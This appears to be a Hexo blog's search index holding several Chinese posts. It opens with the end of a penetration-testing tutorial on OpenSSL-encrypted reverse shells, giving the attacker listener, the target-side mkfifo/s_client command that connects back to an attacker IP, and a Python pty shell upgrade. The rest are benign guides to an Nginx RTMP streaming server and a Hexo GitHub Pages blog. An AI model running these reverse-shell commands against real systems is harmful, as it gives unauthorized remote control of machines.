<h2 id="OpenSSL反弹加密shell"><a href="#OpenSSL反弹加密shell" class="headerlink" title="OpenSSL反弹加密shell"></a>OpenSSL反弹加密shell</h2><p>1、攻击机生成自签名证书：（填写信息全部回车即可）</p>
<pre class="highlight"><span class="line">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre>

<p>2、在攻击机上使用OpenSSL监听一个端口</p>
<pre class="highlight"><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 1111</span><br></pre>

<p>3、在目标机上进行反弹shell</p>
<pre class="highlight"><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.66.138:1111 &gt; /tmp/s; rm /tmp/s</span><br></pre>





<h2 id="反弹shell后获取模拟终端"><a href="#反弹shell后获取模拟终端" class="headerlink" title="反弹shell后获取模拟终端"></a>反弹shell后获取模拟终端</h2><p>上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p>
<p>1、获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。</p>
<p>2、标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</p>
<p>3、获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</p>
<p>若是无法完成正常交互，则需要使用python模拟终端设备，命令如下：</p>
<pre class="highlight"><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre>

]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建Nginx + 直播推流平台</title>
    <url>/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/</url>
    <content><![CDATA[<h1 id="搭建Nginx环境"><a href="#搭建Nginx环境" class="headerlink" title="搭建Nginx环境"></a>搭建Nginx环境</h1><h2 id="1、下载Nginx源码包"><a href="#1、下载Nginx源码包" class="headerlink" title="1、下载Nginx源码包"></a>1、下载Nginx源码包</h2><pre class="highlight"><span class="line">curl http://nginx.org/download/nginx-1.20.1.tar.gz -o nginx-1.20.1.tar.gz</span><br></pre>



<h2 id="2、解压源码包"><a href="#2、解压源码包" class="headerlink" title="2、解压源码包"></a>2、解压源码包</h2><pre class="highlight"><span class="line">tar -zxvf nginx-1.20.1.tar.gz -C ../	# -C指定解压路径</span><br></pre>



<h2 id="3、配置生成文件（一般修改配置文件、日志文件路径）"><a href="#3、配置生成文件（一般修改配置文件、日志文件路径）" class="headerlink" title="3、配置生成文件（一般修改配置文件、日志文件路径）"></a>3、配置生成文件（一般修改配置文件、日志文件路径）</h2><pre class="highlight"><span class="line">./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module</span><br></pre>

<p>注：需要下载配置环境</p>
<p>如：</p>
<pre class="highlight"><span class="line">yum install pcre-devel zlib-devel openssl-devel</span><br></pre>



<h2 id="4、make编译"><a href="#4、make编译" class="headerlink" title="4、make编译"></a>4、make编译</h2><h2 id="5、make-install安装"><a href="#5、make-install安装" class="headerlink" title="5、make install安装"></a>5、make install安装</h2><h2 id="6、添加nginx到环境变量"><a href="#6、添加nginx到环境变量" class="headerlink" title="6、添加nginx到环境变量"></a>6、添加nginx到环境变量</h2><pre class="highlight"><span class="line">ln -s /usr/local/nginx/sbin/nginx /usr/local/bin/</span><br></pre>

<p>（注！ /usr/local/nginx/sbin/nginx为nginx启动文件的绝对路径）</p>
<p>此时可直接使用nginx命令，如：nginx -s stop停止nginx服务</p>
<h2 id="7、关闭防火墙"><a href="#7、关闭防火墙" class="headerlink" title="7、关闭防火墙"></a>7、关闭防火墙</h2><pre class="highlight"><span class="line">systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">systemctl disable firewalld		#永久禁用</span><br></pre>

<p>至此，访问80端口可看到Nginx测试页</p>
<p> 下载任意html静态网站压缩包，解压并复制到Nginx网站路径，即可访问静态网页</p>
<h2 id="8、其他注意事项"><a href="#8、其他注意事项" class="headerlink" title="8、其他注意事项"></a>8、其他注意事项</h2><pre class="highlight"><span class="line">/var/lib/mysql				# mysql数据路径</span><br><span class="line">/usr/local/nginx/html		# Nginx默认网站路径</span><br><span class="line">/etc/nginx/nginx.conf		# Nginx配置文件</span><br></pre>



<p>修改root /var/www/html即可改变默认路径</p>
<p> <img src="/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/1.png" alt="1" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/1.png" class="lozad post-image"></p>
<h1 id="Nginx搭建直播推流平台"><a href="#Nginx搭建直播推流平台" class="headerlink" title="Nginx搭建直播推流平台"></a>Nginx搭建直播推流平台</h1><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p>nginx-http-flv-module-master.zip + OBS Studio（pc端）/杏林推流（app端）</p>
<h2 id="1、源码安装，配置"><a href="#1、源码安装，配置" class="headerlink" title="1、源码安装，配置"></a>1、源码安装，配置</h2><p>在nginx源码编译基础上，增加–add-module=/home/chen/software/nginx-http-flv-module-master（导入为绝对路径），即：</p>
<pre class="highlight"><span class="line">./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module --add-module=/home/chen/software/nginx-http-flv-module-master</span><br></pre>



<h2 id="2、make、make-install"><a href="#2、make、make-install" class="headerlink" title="2、make、make install"></a>2、make、make install</h2><h2 id="3、修改配置文件"><a href="#3、修改配置文件" class="headerlink" title="3、修改配置文件"></a>3、修改配置文件</h2><p>（/etc/nginx/nginx.conf）</p>
<p>在http中新增（与最内层函数同级）</p>
<pre class="highlight"><span class="line">location /live &#123;</span><br><span class="line"></span><br><span class="line">  flv_live on;</span><br><span class="line"></span><br><span class="line">  chunked_transfer_encoding on;</span><br><span class="line"></span><br><span class="line">  add_header Access-Control-Allow-Origin *;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>

<p>在文件末尾新增（与http函数同级）</p>
<pre class="highlight"><span class="line">rtmp &#123;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line"></span><br><span class="line">		listen 1935;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">		application chen &#123;</span><br><span class="line"></span><br><span class="line">			live on;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>

<p>（注！live不可更改，会导致无法加载视频）</p>
<h2 id="4、检查"><a href="#4、检查" class="headerlink" title="4、检查"></a>4、检查</h2><pre class="highlight"><span class="line">nginx -t		# 检测配置文件有无语法错误</span><br><span class="line">nginx -s reload	# 重新加载</span><br></pre>



<h2 id="5、推流设置"><a href="#5、推流设置" class="headerlink" title="5、推流设置"></a>5、推流设置</h2><p>OBS推流设置（PC）</p>
<table>
<thead>
<tr>
<th>说明</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>服务器</td>
<td>rtmp://139.224.x.x/live/</td>
</tr>
<tr>
<td>串流密钥</td>
<td>chen（可更改，类似于密码）</td>
</tr>
</tbody></table>
<p>杏林推流设置（APP）</p>
<pre class="highlight"><span class="line">rtmp://139.224.x.x/live/chen</span><br></pre>



<h2 id="6、观看"><a href="#6、观看" class="headerlink" title="6、观看"></a>6、观看</h2><pre class="highlight"><span class="line">http://bilibili.github.io/flv.js/demo/			#观看视频地址</span><br><span class="line">http://139.224.x.x/live?app=live&amp;stream=chen	#推流视频链接</span><br></pre>

]]></content>
      <categories>
        <category>环境搭建</category>
      </categories>
      <tags>
        <tag>Nginx环境搭建</tag>
        <tag>直播推流平台</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建hexo博客</title>
    <url>/article/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>Github Pages</p>
<p>GitHub Pages 是由 GitHub 官方提供的一种免费的静态站点托管服务，让我们可以在 GitHub 仓库里托管和发布自己的静态网站页面。</p>
<p>Hexo</p>
<p>Hexo 是一个快速、简洁且高效的静态博客框架，它基于 Node.js 运行，可以将我们撰写的 Markdown 文档解析渲染成静态的 HTML 网页。</p>
<h1 id="二、环境准备"><a href="#二、环境准备" class="headerlink" title="二、环境准备"></a>二、环境准备</h1><p>Nodejs + Git + Github账号</p>
<p>（可用choco install nodejs git一键安装）</p>
<h1 id="三、安装"><a href="#三、安装" class="headerlink" title="三、安装"></a>三、安装</h1><h2 id="1、连接github账户"><a href="#1、连接github账户" class="headerlink" title="1、连接github账户"></a>1、连接github账户</h2><table>
<thead>
<tr>
<th>操作</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>设置用户名邮箱</td>
<td>git config –global user.name “zeroChen00”<br>git config –global user.email “<a href="mailto:&#49;&#54;&#53;&#x32;&#x35;&#54;&#x30;&#x39;&#51;&#56;&#x40;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;">&#49;&#54;&#53;&#x32;&#x35;&#54;&#x30;&#x39;&#51;&#56;&#x40;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;</a>“</td>
</tr>
<tr>
<td>创建SSH密匙</td>
<td>ssh-keygen -t rsa -C “<a href="mailto:&#49;&#54;&#x35;&#x32;&#53;&#54;&#48;&#57;&#51;&#56;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;">&#49;&#54;&#x35;&#x32;&#53;&#54;&#48;&#57;&#51;&#56;&#64;&#113;&#x71;&#46;&#x63;&#x6f;&#x6d;</a>“（全部回车）</td>
</tr>
<tr>
<td>添加密匙</td>
<td>1、复制 [C:\Users\用户名.ssh\id_rsa.pub]中密匙<br>2、Github-Setting-SSH and GPG keys-New SSH key，新建Key，贴入密匙</td>
</tr>
<tr>
<td>验证连接</td>
<td>ssh -T <a href="mailto:&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#116;&#x68;&#x75;&#x62;&#x2e;&#x63;&#111;&#109;">&#x67;&#105;&#116;&#x40;&#x67;&#x69;&#116;&#x68;&#x75;&#x62;&#x2e;&#x63;&#111;&#109;</a>（yes确认）<br>显示 “Hi xxx! You’ve successfully……” 即连接成功</td>
</tr>
</tbody></table>
<h2 id="2、创建Github-Pages仓库"><a href="#2、创建Github-Pages仓库" class="headerlink" title="2、创建Github Pages仓库"></a>2、创建Github Pages仓库</h2><p>Github - 加号 - New repository - Repository name 中输入 用户名.github.io - 创建</p>
<p>（注意！仓库用户名需要与github用户名保持一致，否则无法访问）</p>
<h2 id="3、本地安装Hexo博客程序"><a href="#3、本地安装Hexo博客程序" class="headerlink" title="3、本地安装Hexo博客程序"></a>3、本地安装Hexo博客程序</h2><table>
<thead>
<tr>
<th>操作</th>
<th>命令</th>
</tr>
</thead>
<tbody><tr>
<td>使用npm安装Hexo</td>
<td>npm install  -g hexo-cli</td>
</tr>
<tr>
<td>验证安装</td>
<td>hexo -v</td>
</tr>
<tr>
<td>初始化</td>
<td>hexo init</td>
</tr>
<tr>
<td>安装组件</td>
<td>npm install</td>
</tr>
<tr>
<td>生成页面</td>
<td>hexo g</td>
</tr>
<tr>
<td>启动预览</td>
<td>hexo s</td>
</tr>
<tr>
<td>访问<a href="http://localhost:4000/">http://localhost:4000</a></td>
<td>出现hexo默认界面则安装成功</td>
</tr>
</tbody></table>
<p>（注：hexo server -p 5000可更改端口，默认4000）</p>
<h2 id="4、部署Hexo到Github-Pages"><a href="#4、部署Hexo到Github-Pages" class="headerlink" title="4、部署Hexo到Github Pages"></a>4、部署Hexo到Github Pages</h2><table>
<thead>
<tr>
<th>操作</th>
<th align="left">命令</th>
</tr>
</thead>
<tbody><tr>
<td>安装hexo-deployer-git</td>
<td align="left">npm install  hexo-deployer-git –save</td>
</tr>
<tr>
<td>修改 _config.yml 文件末尾的Deployment 部分</td>
<td align="left">deploy: <br>    type: git<br>    repository: <a href="mailto:&#x67;&#105;&#x74;&#64;&#x67;&#105;&#116;&#104;&#x75;&#x62;&#x2e;&#x63;&#x6f;&#x6d;">&#x67;&#105;&#x74;&#64;&#x67;&#105;&#116;&#104;&#x75;&#x62;&#x2e;&#x63;&#x6f;&#x6d;</a>:zeroChen00/zeroChen00.github.io.git<br>    branch: master</td>
</tr>
<tr>
<td>上传部署</td>
<td align="left">hexo d</td>
</tr>
<tr>
<td>访问Giuhub静态博客</td>
<td align="left"><a href="https://zerochen00.github.io/">https://zeroChen00.github.io/</a></td>
</tr>
</tbody></table>
<p>（注意！hexo中所有代码操作，冒号后均要跟一个空格，负责不生效！）</p>
<h1 id="四、主题配置"><a href="#四、主题配置" class="headerlink" title="四、主题配置"></a>四、主题配置</h1><table>
<thead>
<tr>
<th><strong>操作</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td>下载</td>
<td>git  clone <a href="https://github.com/theme-kaze/hexo-theme-kaze.git">https://github.com/theme-kaze/hexo-theme-kaze.git</a>  themes/kaze</td>
</tr>
<tr>
<td>修改全局配置文件_config.yml</td>
<td>theme: kaze</td>
</tr>
<tr>
<td>新建页面</td>
<td>hexo new page “about”</td>
</tr>
<tr>
<td>搜索</td>
<td>search:   enable: true   path: search.json   field: posts   searchContent: true</td>
</tr>
<tr>
<td>其他配置</td>
<td><a href="https://demo.theme-kaze.top/document/">https://demo.theme-kaze.top/document/</a></td>
</tr>
<tr>
<td>开启评论</td>
<td>1、注册OAuth application <br><img src="/article/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/20190708182819187.png" alt="20190708182819187" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/20190708182819187.png" class="lozad post-image"><br>2、修改主题配置文件<img src="/article/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/20190708184151274.png" alt="20190708184151274" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/20190708184151274.png" class="lozad post-image">&lt;br /</td>
</tr>
</tbody></table>
<p>语句如下</p>
<pre class="highlight"><span class="line">gitalk: </span><br><span class="line">    enable: true #是否开启</span><br><span class="line">    clientID: &#x27;e231ce2...&#x27;</span><br><span class="line">    clientSecret: &#x27;2fb4635367c...&#x27;</span><br><span class="line">    repo: &#x27;zeroChen00.github.io&#x27;</span><br><span class="line">    owner: &#x27;zeroChen00&#x27;</span><br><span class="line">    admin: [&#x27;zeroChen00&#x27;]</span><br><span class="line">    id: location.href</span><br><span class="line">    distractionFreeMode: true</span><br><span class="line">    # en | zh-CN | zh-TW</span><br><span class="line">    # language: navigator.language || navigator.userLanguage</span><br><span class="line">    language: zh-CN</span><br><span class="line">    labels: [&#x27;Gitalk&#x27;]</span><br><span class="line">    perPage: 10</span><br></pre>



<h1 id="五、图片无法显示问题"><a href="#五、图片无法显示问题" class="headerlink" title="五、图片无法显示问题"></a>五、图片无法显示问题</h1><p>根目录配置文件开启post_asset_folder: true（typora的需要配置文件上传路径为相同路径）</p>
<p>使用相对路径引用文件即可</p>
<h1 id="六、使用"><a href="#六、使用" class="headerlink" title="六、使用"></a><strong>六、使用</strong></h1><table>
<thead>
<tr>
<th><strong>操作</strong></th>
<th><strong>命令</strong></th>
</tr>
</thead>
<tbody><tr>
<td>1、写博客</td>
<td>hexo new “My New  Post”   source 文件夹中会出现一个 My New  Post.md 文件</td>
</tr>
<tr>
<td>或贴入.md文件（需要增加文件头）</td>
<td>—   title: Hello World   # 标题   date: 2019/3/26  hh:mm:ss   # 时间   categories: # 分类   - Diary tags: # 标签   - PS3   - Games  —</td>
</tr>
<tr>
<td>2、更新并发布静态博客</td>
<td>hexo g # 生成页面   hexo d # 部署发布</td>
</tr>
<tr>
<td>3、更改配置</td>
<td>_config.yml文件（修改时:后跟一个空格）</td>
</tr>
<tr>
<td>4、更换主题</td>
<td><a href="https://hexo.io/themes/">https://hexo.io/themes/</a> git clone <em>file ./themes/file</em>   <em>根据主题介绍进行下载并配置</em>config.yml文件（更改主题名称等）</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>附加</category>
      </categories>
      <tags>
        <tag>hexo博客</tag>
      </tags>
  </entry>
</search>
